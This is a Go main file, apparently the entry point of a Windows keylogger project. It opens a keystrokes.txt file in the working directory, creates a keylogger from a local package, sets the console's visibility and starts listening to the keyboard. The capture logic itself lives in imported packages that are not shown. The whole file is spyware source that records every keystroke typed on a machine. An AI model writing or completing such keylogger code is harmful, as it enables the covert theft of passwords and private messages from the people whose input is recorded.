package main

import (
	"keylogger/util"
	"keylogger/windows"
	"os"
)

func main() {
	var fileName string = "/keystrokes.txt"
	filePath, _ := os.Getwd()

	util.CreateFile(fileName)
	file, _ := os.OpenFile(filePath+fileName, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	logger := windows.NewKeyLogger(file)

	util.SetConsoleVisibility(true)

	logger.ListenKeyboard()
}
